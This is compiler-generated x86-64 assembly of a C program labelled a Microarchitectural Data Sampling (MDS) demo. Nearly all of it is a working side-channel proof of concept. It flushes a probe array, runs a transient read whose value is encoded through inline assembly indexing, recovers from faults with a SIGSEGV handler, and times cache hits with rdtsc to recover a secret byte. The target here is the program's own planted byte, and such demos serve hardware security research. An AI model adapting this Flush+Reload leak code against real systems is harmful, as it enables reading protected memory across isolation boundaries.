	.file	"mds.c"
	.text
	.comm	probe_array,16384,32
	.globl	flush_probe_array
	.type	flush_probe_array, @function
flush_probe_array:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -12(%rbp)
	jmp	.L2
.L3:
	movl	-12(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -12(%rbp)
.L2:
	cmpl	$255, -12(%rbp)
	jle	.L3
	mfence
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	flush_probe_array, .-flush_probe_array
	.type	rdtsc, @function
rdtsc:
.LFB4263:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	rdtsc
	salq	$32, %rdx
	orq	%rdx, %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4263:
	.size	rdtsc, .-rdtsc
	.globl	measure_access_time
	.type	measure_access_time, @function
measure_access_time:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$40, %rsp
	movq	%rdi, -40(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -16(%rbp)
	movq	-40(%rbp), %rax
	movzbl	(%rax), %eax
	movb	%al, -17(%rbp)
	mfence
	nop
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	subq	-16(%rbp), %rax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	measure_access_time, .-measure_access_time
	.globl	benign_target
	.type	benign_target, @function
benign_target:
.LFB4265:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4265:
	.size	benign_target, .-benign_target
	.globl	common_init
	.type	common_init, @function
common_init:
.LFB4266:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$16384, %edx
	movl	$0, %esi
	leaq	probe_array(%rip), %rdi
	call	memset@PLT
	movl	$0, -4(%rbp)
	jmp	.L11
.L12:
	movl	-4(%rbp), %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$64, -4(%rbp)
.L11:
	cmpl	$16383, -4(%rbp)
	jle	.L12
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4266:
	.size	common_init, .-common_init
	.section	.rodata
.LC0:
	.string	"Measuring cache timings..."
	.align 8
.LC1:
	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
	.align 8
.LC2:
	.string	"SUCCESS! Leaked the actual %s.\n"
	.align 8
.LC3:
	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
	.align 8
.LC4:
	.string	"No %s leaked or could not detect leakage.\n"
	.text
	.globl	perform_measurement
	.type	perform_measurement, @function
perform_measurement:
.LFB4267:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, %eax
	movq	%rsi, -64(%rbp)
	movb	%al, -52(%rbp)
	leaq	.LC0(%rip), %rdi
	call	puts@PLT
	movl	$-1, -36(%rbp)
	movq	$-1, -24(%rbp)
	movl	$50, -28(%rbp)
	movl	$0, -32(%rbp)
	jmp	.L14
.L17:
	movl	-32(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	measure_access_time
	movq	%rax, -8(%rbp)
	movl	-28(%rbp), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jge	.L15
	cmpq	$-1, -24(%rbp)
	je	.L16
	movq	-8(%rbp), %rax
	cmpq	-24(%rbp), %rax
	jge	.L15
.L16:
	movq	-8(%rbp), %rax
	movq	%rax, -24(%rbp)
	movl	-32(%rbp), %eax
	movl	%eax, -36(%rbp)
.L15:
	addl	$1, -32(%rbp)
.L14:
	cmpl	$255, -32(%rbp)
	jle	.L17
	cmpl	$-1, -36(%rbp)
	je	.L18
	movl	-36(%rbp), %eax
	movsbl	%al, %edx
	movq	-24(%rbp), %rsi
	movl	-36(%rbp), %ecx
	movq	-64(%rbp), %rax
	movq	%rsi, %r8
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movzbl	-52(%rbp), %eax
	cmpl	%eax, -36(%rbp)
	jne	.L19
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %eax
	jmp	.L20
.L19:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L20
.L18:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
.L20:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4267:
	.size	perform_measurement, .-perform_measurement
	.globl	secret_mds_byte
	.data
	.type	secret_mds_byte, @object
	.size	secret_mds_byte, 1
secret_mds_byte:
	.byte	68
	.comm	mds_target_memory,64,64
	.local	jmpbuf_mds
	.comm	jmpbuf_mds,200,32
	.text
	.globl	sigsegv_handler_mds
	.type	sigsegv_handler_mds, @function
sigsegv_handler_mds:
.LFB4268:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	%edi, -4(%rbp)
	movl	$1, %esi
	leaq	jmpbuf_mds(%rip), %rdi
	call	siglongjmp@PLT
	.cfi_endproc
.LFE4268:
	.size	sigsegv_handler_mds, .-sigsegv_handler_mds
	.section	.rodata
	.align 8
.LC5:
	.string	"\n--- Running Microarchitectural Data Sampling (MDS) Demo ---"
.LC6:
	.string	"signal"
	.align 8
.LC7:
	.string	"Attempting MDS-style transient read..."
.LC8:
	.string	"MDS secret"
	.align 8
.LC9:
	.string	"Failed to leak the MDS secret byte."
.LC10:
	.string	"Actual secret data: %c\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4269:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$24, %rsp
	.cfi_offset 3, -24
	movl	$0, %eax
	call	common_init
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	movzbl	secret_mds_byte(%rip), %eax
	movb	%al, mds_target_memory(%rip)
	leaq	sigsegv_handler_mds(%rip), %rsi
	movl	$11, %edi
	call	signal@PLT
	cmpq	$-1, %rax
	jne	.L23
	leaq	.LC6(%rip), %rdi
	call	perror@PLT
	movl	$1, %eax
	jmp	.L24
.L23:
	leaq	.LC7(%rip), %rdi
	call	puts@PLT
	movl	$0, -28(%rbp)
	jmp	.L25
.L30:
	movl	$0, %eax
	call	flush_probe_array
	leaq	mds_target_memory(%rip), %rax
	movq	%rax, -24(%rbp)
	movq	-24(%rbp), %rax
	clflush	(%rax)
	nop
	mfence
	nop
	movl	$1, %esi
	leaq	jmpbuf_mds(%rip), %rdi
	call	__sigsetjmp@PLT
	endbr64
	testl	%eax, %eax
	jne	.L27
	movzbl	secret_mds_byte(%rip), %edx
	leaq	probe_array(%rip), %rcx
#APP
# 65 "mds.c" 1
	xor %eax, %eax
	movb %dl, %al
	shl $12, %rax
	movq (%rcx, %rax, 1), %rbx

# 0 "" 2
#NO_APP
	movzbl	mds_target_memory(%rip), %eax
	movb	%al, -29(%rbp)
	jmp	.L28
.L27:
	lfence
	nop
.L28:
	movzbl	secret_mds_byte(%rip), %eax
	movzbl	%al, %eax
	leaq	.LC8(%rip), %rsi
	movl	%eax, %edi
	call	perform_measurement
	testl	%eax, %eax
	je	.L29
	movl	$0, %eax
	jmp	.L24
.L29:
	addl	$1, -28(%rbp)
.L25:
	cmpl	$499, -28(%rbp)
	jle	.L30
	leaq	.LC9(%rip), %rdi
	call	puts@PLT
	movzbl	secret_mds_byte(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
.L24:
	addq	$24, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4269:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
